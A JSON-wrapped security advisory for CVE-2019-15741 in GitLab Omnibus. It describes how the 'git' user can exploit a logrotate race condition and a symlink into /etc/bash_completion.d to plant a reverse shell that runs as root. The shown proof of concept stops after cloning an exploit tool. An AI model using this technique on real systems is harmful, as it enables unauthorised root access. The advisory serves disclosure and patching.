{
    "text": "vul_name : GitLab Omnibus 12.2.1 Logrotate Privilege Escalation ， vul_cve : CVE-2019-15741 ， vul_poc :  # Privilege Escalation via Logrotate in Gitlab Omnibus ， Overview ， Identifier : AIT-SA-20190930-01 ， Target : GitLab Omnibus ， Vendor : GitLab ， Version : 7.4 through 12.2.1 ， Fixed in Version : 12.2.3 , 12.1.8 and 12.0.8 ， CVE : CVE-2019-15741 ， Accessibility : Local ， Severity : Low ， Author : Wolfgang Hotwagner ( AIT Austrian Institute of Technology )  ， Summary ， Omnibus GitLab is a way to package different services and tools required to run GitLab , so that most users can install it without laborious configuration. ， Vulnerability Description ， GitLab Omnibus sets the ownership of the log directory to the system-user \"git\" , which might let local users obtain root access because of unsafe ， interaction with logrotate. ， User git owns the log directory /var/log/gitlab :  ， ` ，  # logdir in gitlab-ee :  ， drwxr-xr-x 19 git root 4096 May 12 18 : 43 /var/log/gitlab/ ， ` ， Log files rotate once a day ( or any other frequency if configured ) by logrotate as user root. The configuration does not use the su directive :  ， ` ，  # logrotate-config of gitlab-ee :  ， /var/log/gitlab/gitlab-workhorse/ * .log { ， hourly ， rotate 30 ， compress ， copytruncate ， missingok ， postrotate ， endscript ， } ， ` ， Due to logrotate is prone to a race-condition it is possible for user \"git\" to replace the ， directory /var/log/gitlab/gitlab-workhorse/ with a symbolic link to any ， directory ( for example /etc/bash_completion.d ) . Logrotate will place ， files as user root into /etc/bash_completition.d and set the owner of the file to \"git\". ， An attacker could simply place a reverse-shell into this file. As soon as root logs in , a reverse ， root-shell will be executed. ， Details of the race-condition in logrotate can be found at :  ， Proof of Concept ， The following example illustrates how an attacker who already gained a shell as user git , can elevate his privileges to root. After downloading and compiling ,  ， the exploit gets executed and waits until the next daily run of logrotate. If the rotation of the log file succeeds , a new file that contains the reverse shell ， payload , will be written into /etc/bash_completition.d/ with owner git. As soon as root logs in , the reverse shell gets executed and opens a shell on the ， attackers netcat listener :  ， ` ， git @ Stretch64 :  ~  $ git clone ， /tmp/logrotten ， Cloning into '/tmp/logrotten'. ， remote : Enumerating objects : 84 , done. ， remote : Counting objects : 100% ( 84/84 )  , done. ， remote : Compressing objects : 100% ( 58/58 )  , done. ， remote : Total 84 ( delta 35 )  , reused 64 ( delta 24 )  , pack-reused 0 ， Unpacking objects : 100% ( 84/84 )  , done.",
    "time": "2019.10.05"
}